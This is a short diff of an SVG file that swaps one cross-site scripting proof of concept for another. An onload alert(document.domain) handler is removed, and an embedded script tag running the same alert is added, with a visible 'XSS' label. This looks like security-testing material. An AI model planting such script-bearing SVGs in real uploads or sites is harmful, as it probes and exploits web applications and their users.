@@ -1,2 +1,5 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
+  <rect width="200" height="100" fill="red" />
+  <text x="10" y="50" font-size="20" fill="white">XSS</text>
+  <script>alert(document.domain)</script>
 </svg>
